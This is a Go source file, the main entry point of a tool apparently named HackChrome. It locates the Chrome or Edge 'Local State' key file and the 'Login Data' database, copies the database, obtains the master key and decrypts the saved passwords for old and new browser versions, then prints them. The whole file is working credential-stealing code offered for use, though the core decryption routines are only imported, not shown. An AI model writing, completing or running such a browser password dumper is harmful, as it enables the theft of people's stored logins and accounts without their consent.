package main

import (
	"HackChrome/core"
	"HackChrome/utils"
	"flag"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"os"
	"path/filepath"
)

var isEdge bool

func init() {
	flag.BoolVar(&isEdge, "edge", false, "true or false, default is false and chrome is used.")
}

func main() {
	flag.Parse()
	var browserDirPath string
	if isEdge {
		browserDirPath = "Microsoft/Edge"
	} else {
		browserDirPath = "Google/Chrome"
	}

	keyFile := filepath.Join(os.Getenv("USERPROFILE"), "AppData/Local", browserDirPath, "User Data/Local State")
	origPwdDb := filepath.Join(os.Getenv("USERPROFILE"), "AppData/Local", browserDirPath, "User Data/Default/Login Data")
	pwdDb := "LocalDB"

	utils.CopyFile(origPwdDb, pwdDb)

	masterKey, err := core.GetMaster(keyFile)
	if err != nil {
		fmt.Println(err)
		return
	}

	// chrome > v80
	chromeV80Res := core.GetPwd(pwdDb, masterKey)
	// chrome < v80
	chromeRes := core.GetPwdPre(pwdDb)
	// total
	totalRes := utils.Merge(chromeV80Res, chromeRes)

	err = utils.FormatOutput(totalRes, pwdDb)
	if err != nil {
		fmt.Println(err)
		return
	}
}
